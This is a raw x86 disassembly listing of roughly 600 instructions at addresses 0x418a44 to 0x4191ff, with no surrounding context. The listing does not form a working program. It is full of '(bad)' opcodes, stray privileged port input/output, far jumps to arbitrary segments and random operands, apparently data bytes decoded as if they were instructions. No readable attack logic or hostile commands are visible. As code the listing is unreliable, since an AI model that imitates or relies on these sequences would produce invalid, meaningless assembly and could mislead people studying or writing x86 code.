  418a44:	test   al,0x47
  418a46:	jg     0x418a43
  418a48:	ret    0x6f18
  418a4b:	xlat   BYTE PTR ds:[ebx]
  418a4c:	rcl    BYTE PTR [bx-0x5688],1
  418a51:	push   es
  418a52:	jne    0x418a5a
  418a54:	mov    al,0xfc
  418a56:	xor    BYTE PTR [ebx-0x3d],dl
  418a59:	retf   
  418a5a:	dec    esp
  418a5b:	mov    ds:0xf586695b,eax
  418a60:	cmp    al,0xb9
  418a62:	fsub   st(7),st
  418a64:	sub    ch,BYTE PTR [esi]
  418a66:	xchg   ebx,eax
  418a67:	jle    0x418a8b
  418a69:	ja     0x418a7b
  418a6b:	mov    eax,ds:0x5361749f
  418a70:	aad    0xe
  418a72:	in     al,dx
  418a73:	ret    0xb3b3
  418a76:	add    cl,0xdd
  418a79:	out    0x41,al
  418a7b:	xchg   ebx,eax
  418a7c:	clc    
  418a7d:	(bad)  
  418a7e:	sbb    DWORD PTR [ebp+esi*4+0x41d21631],edx
  418a85:	cwde   
  418a86:	xlat   BYTE PTR ds:[ebx]
  418a87:	(bad)  
  418a88:	adc    ecx,DWORD PTR [esi-0x63267b75]
  418a8e:	pusha  
  418a8f:	add    DWORD PTR [edx-0x27],eax
  418a92:	dec    edx
  418a93:	or     eax,ecx
  418a95:	popa   
  418a96:	iret   
  418a97:	lods   al,BYTE PTR ds:[esi]
  418a98:	fidivr DWORD PTR [eax-0x40]
  418a9b:	stos   DWORD PTR es:[edi],eax
  418a9c:	pop    esi
  418a9d:	test   DWORD PTR [edx],edi
  418a9f:	push   0xbe714b1b
  418aa4:	push   esi
  418aa5:	or     ebx,ebx
  418aa7:	push   ecx
  418aa8:	leave  
  418aa9:	add    DWORD PTR [edx],edx
  418aab:	ret    
  418aac:	pop    ds
  418aad:	clc    
  418aae:	xchg   eax,esi
  418ab0:	or     al,BYTE PTR [ecx]
  418ab2:	mov    ah,0x1b
  418ab4:	mov    al,0xb1
  418ab6:	out    dx,al
  418ab7:	sbb    bh,BYTE PTR [ebp+esi*1-0x65d33d5e]
  418abe:	dec    esp
  418abf:	or     BYTE PTR ds:0x616ec265,ah
  418ac5:	or     BYTE PTR es:[esi+0x1f],ch
  418ac9:	add    ecx,DWORD PTR [esi-0x57]
  418acc:	cmp    eax,0x9b00da41
  418ad1:	test   DWORD PTR [ebx],0x8d822a65
  418ad7:	fwait
  418ad8:	mov    ds:0xa7176370,eax
  418add:	cmp    al,0x9e
  418adf:	fcom   st(2)
  418ae1:	dec    ecx
  418ae2:	call   0x74b5991a
  418ae7:	fimul  WORD PTR [edi]
  418ae9:	jmp    0x2e9e:0x6bf2deb6
  418af0:	adc    al,0x94
  418af2:	inc    edi
  418af3:	repz mov al,0x20
  418af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418af7:	xor    al,0x80
  418af9:	push   edx
  418afa:	jne    0x418b6d
  418afc:	imul   esp,DWORD PTR [esp+edx*8-0x71],0x40
  418b01:	rol    BYTE PTR [esi+0xbd11dc4],1
  418b07:	pop    ebp
  418b08:	fmulp  st(1),st
  418b0a:	in     al,0x8a
  418b0c:	or     eax,0xe18641d6
  418b11:	in     al,dx
  418b12:	xor    BYTE PTR [eax-0x70],dh
  418b15:	out    0x41,al
  418b17:	adc    BYTE PTR [ecx*2+0x3f101698],0x6f
  418b1f:	add    al,0xb5
  418b21:	jmp    0x418afe
  418b23:	xchg   esi,eax
  418b24:	sti    
  418b25:	and    eax,0xa51747f1
  418b2a:	cmp    edx,edx
  418b2c:	cmp    al,0xc3
  418b2e:	xor    BYTE PTR [esi],dh
  418b30:	cmc    
  418b31:	or     BYTE PTR [ebx-0x2b],bl
  418b34:	(bad)  
  418b35:	fnstcw WORD PTR [edi]
  418b37:	mov    cl,0x6f
  418b39:	push   cs
  418b3a:	das    
  418b3b:	cmp    BYTE PTR [ecx+0x7afcda61],ch
  418b41:	inc    ebx
  418b42:	das    
  418b43:	cld    
  418b44:	inc    esi
  418b45:	fild   QWORD PTR [edx+0x7b6e8cf2]
  418b4b:	aad    0x59
  418b4d:	mov    ds:0xa238777b,eax
  418b52:	dec    dh
  418b54:	shl    BYTE PTR [esi-0x43c55c16],cl
  418b5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b5b:	mov    edx,0xecdcbf32
  418b60:	pop    ecx
  418b61:	arpl   bx,bp
  418b63:	xchg   DWORD PTR [edx+ecx*2+0x44551389],ebx
  418b6a:	mov    ds:0x9d810475,eax
  418b6f:	jns    0x418b5c
  418b71:	gs inc ecx
  418b73:	mov    bl,0x4
  418b75:	leave  
  418b76:	dec    esi
  418b77:	push   cs
  418b78:	xor    al,0x6d
  418b7a:	jne    0x418b64
  418b7c:	xchg   esp,eax
  418b7d:	jge    0x418b8d
  418b7f:	push   ebp
  418b80:	and    dh,ch
  418b82:	jo     0x418b1f
  418b84:	ds jp  0x418b67
  418b87:	dec    eax
  418b88:	scas   al,BYTE PTR es:[edi]
  418b89:	imul   eax,DWORD PTR [eax],0x4f661537
  418b8f:	bound  esi,QWORD PTR [esi+ebx*8+0x72]
  418b93:	push   esp
  418b94:	xor    BYTE PTR [edx-0x2b],0x26
  418b98:	ja     0x418c0d
  418b9a:	sbb    DWORD PTR ds:0x3cf705df,edi
  418ba0:	cmp    edi,DWORD PTR [eax+ecx*1+0x50c6eee5]
  418ba7:	sbb    eax,0xfd1b74a2
  418bac:	and    edi,esi
  418bae:	ror    BYTE PTR [eax-0x4b6adcf3],cl
  418bb4:	mov    al,ds:0x201fe5dd
  418bb9:	sub    al,0xf2
  418bbb:	mov    bh,0x83
  418bbd:	push   edi
  418bbe:	sub    al,BYTE PTR [ebx]
  418bc0:	mov    edx,0xdc2bcac4
  418bc5:	(bad)  
  418bc6:	sti    
  418bc7:	popf   
  418bc8:	adc    ah,BYTE PTR [edi+ecx*4-0x5e]
  418bcc:	scas   al,BYTE PTR es:[edi]
  418bcd:	std    
  418bce:	xchg   ecx,eax
  418bcf:	xchg   esp,eax
  418bd0:	mov    edx,0x9cba782a
  418bd5:	ins    DWORD PTR es:[edi],dx
  418bd6:	pop    ds
  418bd7:	sub    DWORD PTR [edi+0x5a],0xa
  418bdb:	out    dx,eax
  418bdc:	nop
  418bdd:	add    esp,esp
  418bdf:	loop   0x418bb3
  418be1:	sbb    al,0xf
  418be3:	or     DWORD PTR [ecx],esp
  418be5:	es sub ah,0x69
  418be9:	adc    BYTE PTR [ebx+0x8],al
  418bec:	test   eax,0xce71fb36
  418bf1:	adc    ch,al
  418bf3:	ss call 0x26f0499e
  418bf9:	jae    0x418bf6
  418bfb:	mov    bl,0x55
  418bfd:	inc    ebp
  418bfe:	aad    0xa8
  418c00:	mov    bh,0xa1
  418c02:	jge    0x418bf3
  418c04:	sbb    cl,BYTE PTR gs:[esi]
  418c07:	ss jecxz 0x418bc8
  418c0a:	push   cs
  418c0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c0c:	call   FWORD PTR [edi-0x5e891a0b]
  418c12:	xor    al,0x1
  418c14:	in     al,dx
  418c15:	in     eax,dx
  418c16:	mov    edi,0x562e83ef
  418c1b:	and    DWORD PTR [eax-0x461420c4],esp
  418c21:	mov    ds,WORD PTR [edi+0x7a]
  418c24:	sbb    BYTE PTR [edi+0x53],ah
  418c27:	iret   
  418c28:	push   0x4c
  418c2a:	call   0xf4487725
  418c2f:	push   0x453d8c98
  418c34:	push   edi
  418c35:	mov    ah,0xa1
  418c37:	shl    DWORD PTR [eax],cl
  418c39:	sub    al,0x38
  418c3b:	dec    esi
  418c3c:	cwde   
  418c3d:	adc    eax,0x700ec863
  418c42:	enter  0x8b51,0xa
  418c46:	xchg   ecx,eax
  418c47:	mov    ah,0xf5
  418c49:	sub    ah,bl
  418c4b:	aas    
  418c4c:	gs popa 
  418c4e:	pop    edi
  418c4f:	aam    0x43
  418c51:	jecxz  0x418ca1
  418c53:	dec    esp
  418c54:	inc    esi
  418c55:	nop
  418c56:	and    BYTE PTR [ebx+0x5b449f23],bl
  418c5c:	mov    edi,0x71b85098
  418c61:	mov    edi,0x78abe554
  418c66:	xchg   edx,eax
  418c67:	fwait
  418c68:	adc    eax,0xa2880141
  418c6d:	dec    esp
  418c6e:	cmp    BYTE PTR [edx+edx*2-0xa],dl
  418c72:	inc    edx
  418c73:	mov    ah,0xb5
  418c75:	inc    ebp
  418c76:	(bad)  
  418c77:	push   ebp
  418c78:	and    esp,DWORD PTR [ecx+0x2a22b673]
  418c7e:	jecxz  0x418cf5
  418c80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c81:	cmp    eax,eax
  418c83:	mov    DWORD PTR [ebx],edi
  418c85:	xchg   ebx,eax
  418c86:	push   eax
  418c87:	jle    0x418cda
  418c89:	sbb    esp,DWORD PTR [edi-0x43]
  418c8c:	or     DWORD PTR [eax+0x2a6c99ea],ecx
  418c92:	popf   
  418c93:	stos   BYTE PTR es:[edi],al
  418c94:	(bad)  
  418c95:	out    0xb2,al
  418c97:	ror    BYTE PTR [edx],0xd7
  418c9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c9b:	daa    
  418c9c:	and    al,0xc2
  418c9e:	and    DWORD PTR [edx],ebx
  418ca0:	fmul   DWORD PTR [edx]
  418ca2:	mov    bh,0x8c
  418ca4:	dec    ebp
  418ca5:	jns    0x418cfe
  418ca7:	enter  0x8ea1,0xb8
  418cab:	shl    BYTE PTR [edi+0x471007f9],cl
  418cb1:	fbld   TBYTE PTR [esi+0x2adc5796]
  418cb7:	nop
  418cb8:	leave  
  418cb9:	sar    DWORD PTR ds:[esi],0x88
  418cbd:	loopne 0x418d04
  418cbf:	push   edi
  418cc0:	cmc    
  418cc1:	arpl   WORD PTR [edi],ax
  418cc3:	dec    esi
  418cc4:	out    dx,eax
  418cc5:	(bad)  
  418cc6:	pop    ebp
  418cc7:	outs   dx,DWORD PTR ds:[esi]
  418cc8:	add    ebp,ebx
  418cca:	xor    eax,0xa486e969
  418ccf:	shl    ebx,cl
  418cd1:	icebp  
  418cd2:	neg    DWORD PTR [ecx]
  418cd4:	sbb    esp,DWORD PTR [edi]
  418cd6:	inc    ebx
  418cd7:	out    dx,eax
  418cd8:	dec    esp
  418cd9:	mov    edx,0x5811422c
  418cde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cdf:	adc    ch,BYTE PTR [eax+edx*2]
  418ce2:	imul   edi,DWORD PTR [edx-0x32],0xffffffc6
  418ce6:	ins    DWORD PTR es:[edi],dx
  418ce7:	cmp    eax,0x54c9f190
  418cec:	nop
  418ced:	jmp    0x41c15ff3
  418cf2:	mov    dh,0x9f
  418cf4:	cmp    al,0xef
  418cf6:	aam    0xd6
  418cf8:	cwde   
  418cf9:	mov    al,0x23
  418cfb:	jle    0x418cdf
  418cfd:	hlt    
  418cfe:	repnz mov bl,0x19
  418d01:	stos   DWORD PTR es:[edi],eax
  418d02:	xchg   edx,eax
  418d03:	(bad)  
  418d04:	xor    eax,0xe3557e8c
  418d09:	repnz and DWORD PTR ds:0x55175c1a,0x149e461
  418d14:	call   0x7dfd:0x2e41a2f6
  418d1b:	mov    esp,0xcd33de72
  418d20:	xchg   ebp,eax
  418d21:	test   eax,0x6bb59fdd
  418d26:	cmp    dl,BYTE PTR ds:0xb6f58db1
  418d2c:	jne    0x418d4e
  418d2e:	js     0x418cbb
  418d30:	mov    al,ah
  418d32:	fisub  DWORD PTR [ecx-0x38]
  418d35:	dec    ebx
  418d36:	shl    BYTE PTR ds:0x2ef76114,1
  418d3c:	cmp    al,0xf6
  418d3e:	data16 sahf 
  418d40:	daa    
  418d41:	ret    0x66ee
  418d44:	adc    eax,edi
  418d46:	sub    eax,0xbc4388dc
  418d4b:	outs   dx,BYTE PTR ds:[esi]
  418d4c:	pop    ebx
  418d4d:	xchg   BYTE PTR [ecx],al
  418d4f:	out    dx,eax
  418d50:	dec    ebx
  418d51:	fs mov esp,0xffb3ae51
  418d57:	dec    eax
  418d58:	cmp    BYTE PTR [eax],bl
  418d5a:	mov    bh,0xd0
  418d5c:	jb     0x418d43
  418d5e:	out    dx,al
  418d5f:	jb     0x418d12
  418d61:	out    0x59,al
  418d63:	pop    ecx
  418d64:	xchg   esi,eax
  418d65:	cdq    
  418d66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d67:	in     al,0x6f
  418d69:	pop    es
  418d6a:	sbb    DWORD PTR [ebx+0x60dcaa82],esi
  418d70:	ja     0x418de9
  418d72:	jge    0x418d1a
  418d74:	mov    bl,0x93
  418d76:	cs cmp ah,bh
  418d79:	xor    al,BYTE PTR [ebx+eax*4]
  418d7c:	rcr    DWORD PTR [edx+0x67f1911b],cl
  418d82:	inc    ebx
  418d83:	pop    esp
  418d84:	xchg   DWORD PTR [esi-0x2e],esp
  418d87:	jp     0x418d67
  418d89:	mov    esi,0xadaef4dd
  418d8e:	jge    0x418d4e
  418d90:	in     eax,dx
  418d91:	xchg   BYTE PTR ds:0x40b4e53d,dh
  418d97:	xor    al,BYTE PTR [esi+0x49]
  418d9a:	xor    eax,0x9299bc06
  418d9f:	xor    ecx,eax
  418da1:	cmp    bl,BYTE PTR [ebx+0x0]
  418da4:	mov    edi,0x2f17a195
  418da9:	out    dx,al
  418daa:	daa    
  418dab:	mov    ecx,edi
  418dad:	fcomp  QWORD PTR [ebx+0x1f4d289e]
  418db3:	inc    bx
  418db5:	fbstp  TBYTE PTR [esp+ebp*8-0x18]
  418db9:	sbb    ebx,DWORD PTR [eax]
  418dbb:	adc    DWORD PTR [ebx-0x17],esp
  418dbe:	adc    BYTE PTR [esi+0x3c],0x4a
  418dc2:	and    al,0x88
  418dc4:	mov    WORD PTR [edi-0x72775998],?
  418dca:	ins    DWORD PTR es:[edi],dx
  418dcb:	mov    ch,0xe
  418dcd:	lds    esi,FWORD PTR [edx]
  418dcf:	das    
  418dd0:	(bad)  
  418dd1:	sub    DWORD PTR [ebx-0x798a67f3],edx
  418dd7:	xor    DWORD PTR [ecx+ebx*2-0x61],edi
  418ddb:	bound  edi,QWORD PTR [ecx]
  418ddd:	push   ecx
  418dde:	push   0x3f
  418de0:	push   edx
  418de1:	stc    
  418de2:	pop    es
  418de3:	aam    0x92
  418de5:	ds inc ebx
  418de7:	mov    dh,0x9
  418de9:	mov    esi,DWORD PTR [esi-0x7f]
  418dec:	adc    al,0xdb
  418dee:	push   ebp
  418def:	mov    edi,0xa0173634
  418df4:	mov    al,ds:0x67b3b2ba
  418df9:	jnp    0x418dfb
  418dfb:	push   ss
  418dfc:	xor    esi,eax
  418dfe:	inc    ebp
  418dff:	sbb    edx,DWORD PTR [esi]
  418e01:	out    0x6e,al
  418e03:	mov    dh,0xd5
  418e05:	mov    esi,0xc061b64f
  418e0a:	das    
  418e0b:	jmp    0x2576:0x38502fe1
  418e12:	iret   
  418e13:	add    esp,ebp
  418e15:	jl     0x418e52
  418e17:	js     0x418dfa
  418e19:	lds    ebp,FWORD PTR [ebx]
  418e1b:	xchg   ebx,eax
  418e1c:	and    DWORD PTR [ebp+0x56],edx
  418e1f:	jg     0x418dd7
  418e21:	and    al,0x1d
  418e23:	lfs    esi,FWORD PTR [ecx-0x68e175ca]
  418e2a:	retf   0x3cf0
  418e2d:	mov    dh,0xb5
  418e2f:	outs   dx,WORD PTR ds:[esi]
  418e31:	dec    eax
  418e32:	test   BYTE PTR ds:0x42a87fe9,bl
  418e38:	sbb    cl,BYTE PTR [ebp-0x22]
  418e3b:	ds jecxz 0x418e57
  418e3e:	inc    esi
  418e3f:	or     eax,0xae6b98b3
  418e44:	test   DWORD PTR [edi-0x80],ebp
  418e47:	sbb    BYTE PTR [ecx-0x41],ah
  418e4a:	cli    
  418e4b:	jl     0x418e6e
  418e4d:	addr16 sti 
  418e4f:	cmp    BYTE PTR [ebx],bl
  418e51:	(bad)  
  418e52:	pushf  
  418e53:	inc    eax
  418e54:	adc    al,0x77
  418e56:	pop    esp
  418e57:	cdq    
  418e58:	dec    ebp
  418e59:	loopne 0x418e3a
  418e5b:	sub    ch,cl
  418e5d:	and    edx,ebp
  418e5f:	outs   dx,DWORD PTR ds:[esi]
  418e60:	sub    al,0xc8
  418e62:	je     0x418e5d
  418e64:	rcr    BYTE PTR [ebx-0x3bde6528],cl
  418e6a:	dec    ecx
  418e6b:	add    BYTE PTR [ecx+0x1a8dcab2],bl
  418e71:	jge    0x418e04
  418e73:	aaa    
  418e74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e75:	inc    ecx
  418e76:	ins    DWORD PTR es:[edi],dx
  418e77:	jge    0x418e3c
  418e79:	push   es
  418e7a:	mul    al
  418e7c:	ret    
  418e7d:	cmp    al,0xe4
  418e7f:	sti    
  418e80:	mov    gs,ebx
  418e82:	or     eax,0xcbb85fec
  418e87:	and    bl,cl
  418e89:	gs retf 
  418e8b:	jl     0x418e6d
  418e8d:	outs   dx,DWORD PTR ds:[esi]
  418e8e:	fmul   st,st(4)
  418e90:	push   ebp
  418e91:	lods   eax,DWORD PTR ds:[esi]
  418e92:	icebp  
  418e93:	jl     0x418eea
  418e95:	(bad)  
  418e97:	call   0x2ae5:0x3c997adf
  418e9e:	xchg   ebx,eax
  418e9f:	pop    eax
  418ea0:	push   ss
  418ea1:	add    DWORD PTR [esi+0x76],esi
  418ea4:	sub    al,0xb3
  418ea6:	(bad)  
  418ea7:	xlat   BYTE PTR ds:[ebx]
  418ea8:	stos   BYTE PTR es:[edi],al
  418ea9:	dec    ecx
  418eaa:	and    bl,BYTE PTR [esi-0x196ac394]
  418eb0:	mov    ecx,0x621c9035
  418eb5:	pop    ebp
  418eb6:	jecxz  0x418f1d
  418eb8:	repz push edx
  418eba:	or     BYTE PTR [ecx-0x18],cl
  418ebd:	out    0xe1,eax
  418ebf:	(bad)  
  418ec1:	aas    
  418ec2:	add    ebx,ebp
  418ec4:	stc    
  418ec5:	cmp    al,0x73
  418ec7:	jmp    0x418e60
  418ec9:	ret    0xe0b
  418ecc:	xor    ch,ah
  418ece:	sbb    DWORD PTR [esi-0x1861ddca],edx
  418ed4:	gs in  eax,0xbd
  418ed7:	mov    WORD PTR [ecx+0x71],gs
  418eda:	mov    dl,0x23
  418edc:	pop    ebx
  418edd:	sbb    al,0x7b
  418edf:	xchg   BYTE PTR [ecx],al
  418ee1:	inc    dl
  418ee3:	call   0x1e29:0xe228ec36
  418eea:	(bad)  
  418eeb:	sub    al,BYTE PTR [esi+edx*2]
  418eee:	shr    BYTE PTR [ebp+0x1c],cl
  418ef1:	mov    ?,edi
  418ef3:	and    ah,BYTE PTR [ebp-0x4b]
  418ef6:	add    eax,0x52da88c0
  418efb:	and    al,0x48
  418efd:	mov    ebx,gs
  418eff:	stc    
  418f00:	and    eax,ecx
  418f02:	rcr    ah,0x77
  418f05:	out    dx,al
  418f06:	scas   al,BYTE PTR es:[edi]
  418f07:	push   eax
  418f08:	imul   ecx,DWORD PTR [edx+0x48],0xd
  418f0c:	and    eax,0x6bcd79ff
  418f11:	js     0x418ee6
  418f13:	cmp    BYTE PTR ds:0xa892e353,cl
  418f19:	adc    BYTE PTR [esi+0x31a764a7],0x27
  418f20:	(bad)  
  418f21:	pop    esi
  418f22:	fcmovbe st,st(1)
  418f24:	mov    ds:0xc8f4809,eax
  418f29:	aas    
  418f2a:	fcom   QWORD PTR [edi]
  418f2c:	sub    DWORD PTR [esi+0x14],edi
  418f2f:	test   BYTE PTR [esi],cl
  418f31:	xor    eax,0xd2c0a131
  418f36:	dec    esp
  418f37:	xchg   edi,eax
  418f38:	daa    
  418f39:	xchg   BYTE PTR [eax-0x54aee43c],ah
  418f3f:	push   ebx
  418f40:	data16 rcr BYTE PTR [eax+0x3],0xd8
  418f45:	or     BYTE PTR [ecx-0x755b8493],0x70
  418f4c:	shl    BYTE PTR [edi-0xf980a36],cl
  418f52:	imul   DWORD PTR [edx-0x2]
  418f55:	xor    DWORD PTR [ecx],0x5720dcec
  418f5b:	rol    BYTE PTR [esi-0xdfa11b4],1
  418f61:	sahf   
  418f62:	jmp    0x617d:0x3b59dfce
  418f69:	shl    ecx,0x35
  418f6c:	in     eax,0xe2
  418f6e:	sub    al,BYTE PTR [ebx-0x47]
  418f71:	ret    
  418f72:	sub    al,0x64
  418f74:	jl     0x418fda
  418f76:	mov    esp,0x8ee4e322
  418f7b:	pop    ebx
  418f7c:	inc    edi
  418f7d:	mov    bl,0xbe
  418f7f:	jo     0x419000
  418f81:	xchg   esi,eax
  418f82:	call   0x74b0bc19
  418f87:	mov    edi,0xfa645627
  418f8c:	div    eax
  418f8e:	xchg   ebx,edx
  418f90:	mov    bl,al
  418f92:	in     al,0xb6
  418f94:	mov    dl,0x3
  418f96:	sub    ch,cl
  418f98:	push   esp
  418f99:	repz fcmovnb st,st(7)
  418f9c:	pop    eax
  418f9d:	(bad)  
  418f9e:	fld    DWORD PTR [esp+ebx*2]
  418fa1:	add    eax,DWORD PTR ds:[esi]
  418fa4:	or     bh,BYTE PTR ds:0x5c9b04ef
  418faa:	mov    WORD PTR [edx+esi*4-0x7d7f86d2],es
  418fb1:	sahf   
  418fb2:	pushf  
  418fb3:	add    al,0x6e
  418fb5:	cmp    DWORD PTR [ebp+ecx*4-0x43],esi
  418fb9:	adc    DWORD PTR [ebp-0x69],ecx
  418fbc:	bound  eax,QWORD PTR [eax+0x4503789b]
  418fc2:	inc    esp
  418fc3:	fcom   QWORD PTR [ecx]
  418fc5:	pushf  
  418fc6:	and    bh,BYTE PTR [esi+0x1e]
  418fc9:	aas    
  418fca:	xor    ecx,DWORD PTR [ebx+0x2c]
  418fcd:	sub    eax,0x81ad7b31
  418fd2:	push   ecx
  418fd3:	dec    ebp
  418fd4:	add    eax,0x27d3265b
  418fd9:	sar    DWORD PTR ds:0xbfa0526b,1
  418fdf:	pop    edi
  418fe0:	enter  0xd548,0x69
  418fe4:	ret    0x810d
  418fe7:	push   ebp
  418fe8:	fisub  DWORD PTR [eax-0x51]
  418feb:	xor    ecx,DWORD PTR [eax-0xe]
  418fee:	adc    cl,BYTE PTR [ecx-0x26]
  418ff1:	out    0x7a,eax
  418ff3:	mov    ch,0x3b
  418ff5:	jb     0x41905e
  418ff7:	push   ebp
  418ff8:	into   
  418ff9:	cmp    al,0x72
  418ffb:	push   0xd4d0fc1e
  419000:	push   ebx
  419001:	add    bl,BYTE PTR ds:0xafc516b
  419007:	adc    BYTE PTR [eax+esi*4+0x343cb1e0],dl
  41900e:	mov    dh,0x45
  419010:	lahf   
  419011:	adc    eax,0x81f0ba53
  419016:	mov    esi,0x41dceaaa
  41901b:	dec    ebx
  41901c:	xor    al,0x78
  41901e:	sub    esi,DWORD PTR [ecx-0x65]
  419021:	ins    DWORD PTR es:[edi],dx
  419022:	and    al,0x51
  419024:	push   esp
  419025:	mov    bl,0x9e
  419027:	sub    eax,0xc9f0f7aa
  41902c:	sbb    BYTE PTR [eax],0xc9
  41902f:	dec    esi
  419030:	dec    ebx
  419031:	sub    al,0x18
  419033:	add    esp,DWORD PTR [ecx]
  419035:	retf   0x899c
  419038:	push   es
  419039:	je     0x41903a
  41903b:	add    DWORD PTR [eax],0x520e2f50
  419041:	in     al,dx
  419042:	sbb    eax,0x78c18d64
  419047:	add    ch,BYTE PTR [edx-0x6d]
  41904a:	inc    esi
  41904c:	(bad)  
  41904d:	call   0xcfb5:0x4de14c4d
  419054:	pop    ecx
  419055:	xor    eax,0xada0aadc
  41905a:	xor    ah,cl
  41905c:	fcom   DWORD PTR [ecx-0x39]
  41905f:	sub    edx,DWORD PTR [ecx+0x42396205]
  419065:	or     eax,0xd8021fc6
  41906a:	mov    cl,0x58
  41906c:	sbb    eax,0x4031e62a
  419071:	cmp    DWORD PTR gs:[eax+eax*4],ebx
  419075:	cmc    
  419076:	pop    esp
  419077:	retf   0xba8f
  41907a:	bound  eax,QWORD PTR [ebp+esi*2-0x18]
  41907e:	inc    eax
  41907f:	add    al,0x89
  419081:	jno    0x91be5c0c
  419087:	ds popa 
  419089:	aas    
  41908a:	jae    0x4190c1
  41908c:	in     al,dx
  41908d:	push   cs
  41908e:	mov    ecx,DWORD PTR [eax+0x45]
  419091:	mov    edx,0x7227b833
  419096:	cmp    eax,0xba409e16
  41909b:	retf   
  41909c:	xlat   BYTE PTR ds:[ebx]
  41909d:	ins    BYTE PTR es:[edi],dx
  41909e:	inc    ebp
  41909f:	dec    edi
  4190a0:	lahf   
  4190a1:	push   0x2a
  4190a3:	mov    es,WORD PTR [edi+edx*8]
  4190a6:	push   0x8eb1fcad
  4190ab:	sbb    al,0xca
  4190ad:	jne    0x4190c8
  4190af:	xchg   edx,eax
  4190b0:	jg     0x419059
  4190b2:	pop    edi
  4190b3:	stos   BYTE PTR es:[edi],al
  4190b4:	ret    0x409
  4190b7:	mov    al,0xe5
  4190b9:	jbe    0x419139
  4190bb:	pop    ds
  4190bc:	sbb    BYTE PTR [esi+0x3f],bl
  4190bf:	pop    ebx
  4190c0:	cmp    eax,0xfcde1ad3
  4190c5:	dec    ebx
  4190c6:	push   cs
  4190c7:	adc    dh,0xe2
  4190ca:	add    al,0x58
  4190cc:	inc    ecx
  4190cd:	sub    al,al
  4190cf:	(bad)  
  4190d1:	lahf   
  4190d2:	push   esi
  4190d3:	mov    esi,DWORD PTR [edx]
  4190d5:	xchg   ebp,eax
  4190d6:	adc    DWORD PTR [ecx+eax*4],0x4c
  4190da:	cmp    BYTE PTR ds:0x36c585a0,ah
  4190e0:	sbb    esp,DWORD PTR [ecx+ebx*1-0x5f]
  4190e4:	mov    eax,ds:0x457c2dbb
  4190e9:	add    DWORD PTR [eax+edi*8-0xf9c18e8],edi
  4190f0:	push   ds
  4190f1:	or     BYTE PTR [eax+ebx*4-0x6f99f883],ch
  4190f8:	push   esi
  4190f9:	adc    ebx,DWORD PTR [ebp+0x2e28ca98]
  4190ff:	xchg   esi,eax
  419100:	daa    
  419101:	add    BYTE PTR [ebp*1+0x6ffaabea],dh
  419108:	xchg   BYTE PTR [ecx+edx*4-0x2e],ch
  41910c:	sti    
  41910d:	cwde   
  41910e:	cmc    
  41910f:	or     al,0xc3
  419111:	loop   0x419119
  419113:	push   0x3aa33fcf
  419118:	jmp    DWORD PTR [ecx]
  41911a:	sbb    eax,0xa329561
  41911f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419120:	or     DWORD PTR [ebp+0x37a10984],0xc3735205
  41912a:	nop
  41912b:	popa   
  41912c:	cli    
  41912d:	pop    edi
  41912e:	mov    al,0xc7
  419130:	out    0x6c,eax
  419132:	jge    0x41919c
  419134:	cmp    DWORD PTR [edi-0x413abe55],edi
  41913a:	xor    esp,DWORD PTR [edx+0x36cb008f]
  419140:	mov    ch,0x7d
  419142:	jb     0x41910e
  419144:	outs   dx,DWORD PTR ds:[esi]
  419145:	gs aam 0x74
  419148:	mov    esi,0xe8da970e
  41914d:	mov    ?,WORD PTR [ebx+0x39a0be3]
  419153:	xchg   ebx,eax
  419154:	add    bh,BYTE PTR [esi+ebp*1+0x4c3d37f7]
  41915b:	arpl   WORD PTR [esi+ebp*1],di
  41915e:	pop    ecx
  41915f:	test   eax,0x4b1d15a0
  419164:	sub    DWORD PTR [edi+0x34],ebx
  419167:	xchg   ebx,eax
  419168:	push   ebp
  419169:	inc    ebx
  41916a:	retf   
  41916b:	aaa    
  41916c:	pop    ss
  41916d:	lahf   
  41916e:	cwde   
  41916f:	and    DWORD PTR [ebx-0x68e6c0bd],ebp
  419175:	push   es
  419176:	cwde   
  419177:	mov    dh,BYTE PTR [esi+0x62e837f6]
  41917d:	in     al,0xaf
  41917f:	addr16 (bad) 
  419181:	sub    ch,BYTE PTR [ebx-0x3]
  419184:	je     0x419147
  419186:	jl     0x41914c
  419188:	(bad)  
  419189:	push   ebp
  41918a:	mov    esp,0x4d7a0dba
  41918f:	mov    bh,0x9b
  419191:	jle    0x419116
  419193:	sub    BYTE PTR [eax],0x3a
  419196:	mov    ds:0xc6e8bb6f,eax
  41919b:	dec    esp
  41919c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41919d:	mov    WORD PTR [esi+0x6f],es
  4191a0:	jbe    0x419197
  4191a2:	mov    bh,0x42
  4191a4:	sub    eax,0xee9a3e6f
  4191a9:	out    0xb5,al
  4191ab:	cmp    bh,BYTE PTR [eax+0x16]
  4191ae:	repz les ebx,FWORD PTR [ecx-0x7f1afa48]
  4191b5:	adc    BYTE PTR [ecx+0x747d9a35],bh
  4191bb:	sti    
  4191bc:	mov    al,0xd7
  4191be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191bf:	(bad)  
  4191c0:	ins    DWORD PTR es:[edi],dx
  4191c1:	pusha  
  4191c2:	cwde   
  4191c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191c4:	jmp    0xe3caf45e
  4191c9:	xchg   ebx,eax
  4191ca:	fwait
  4191cb:	mov    esp,0x89ae49e8
  4191d0:	in     eax,0x58
  4191d2:	fs xchg ebp,eax
  4191d4:	in     al,dx
  4191d5:	mov    al,ds:0xafeea8f8
  4191da:	xchg   ecx,eax
  4191db:	sub    al,0x6
  4191dd:	xchg   ecx,eax
  4191de:	je     0x4191a6
  4191e0:	jg     0x419189
  4191e2:	pop    edi
  4191e3:	and    BYTE PTR [eax+ebx*2-0x52],0xc1
  4191e8:	inc    ebx
  4191e9:	ss (bad) 
  4191eb:	sbb    ah,BYTE PTR [edx+0x60]
  4191ee:	dec    BYTE PTR [esi-0x13d3c3e1]
  4191f4:	xchg   esp,eax
  4191f5:	dec    ecx
  4191f6:	enter  0xa2f7,0xbf
  4191fa:	mov    eax,ds:0xe605807b
  4191ff:	(bad)  [edx]
